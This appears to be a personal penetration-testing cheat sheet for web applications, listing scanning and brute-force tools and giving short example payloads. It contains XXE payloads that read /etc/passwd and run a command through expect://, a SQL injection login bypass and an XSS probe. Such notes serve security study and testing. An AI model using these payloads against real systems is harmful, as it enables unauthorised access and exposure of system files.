---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Enumeration](#enumeration)
* [Authentication](#authentication)
* [Session Management](#session-management)
* [XML External Entity](#xml-external-entity)
* [SQL Injection](#sql-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [Deserialization](#deserialization)
* [Other Tools](#other-tools)
* [Methodology](#methodology)

## Enumeration

Enumerating a web application is best performed manually with automated augmentations.

### Spidering

`burpsuite`

### Directory Brute Forcing

`dirbuster`

### Web Server Scanning

`nikto`

---

## Authentication

### Brute Forcing Online

`hydra`

---

## Session Management

---

## XML External Entity

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## SQL Injection

Suppose a SQL query like below, where parameters are received from user input

```SQL
SELECT id FROM users WHERE username='$username' AND password='$password';
```

If we managed to input data like below we could return unintended data.

```SQL
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.
```
sqlmap
```

---

## Cross Site Scripting

Wherever user input is reflect in the site test for XSS with:

``` Javascript
    <script>alert('x')</script>
```

---

## Deserialization

---

## Other Tools

* FoxyProxy - simple proxy switcher for firefox
* w3af - Web Application Scanner
* wikto/Nikto - Web server scanner
* Firebug/Chrome Dev tools - Inspecting client side
* Hydra - Password brute forcing
* wpscan - Scan wordpress
* droopscan - scan Drupal & Silverstripe CMS

### Unix Commands

* wget - easily download files
* curl - can make post requests too
* ncat - tcp/ip swiss army knife
* socat - two way netcat
* stunnel - ssl tunnel

---

## Methodology

See:
* The Web Application Hacker's Handbook - Chapter 21
* https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/
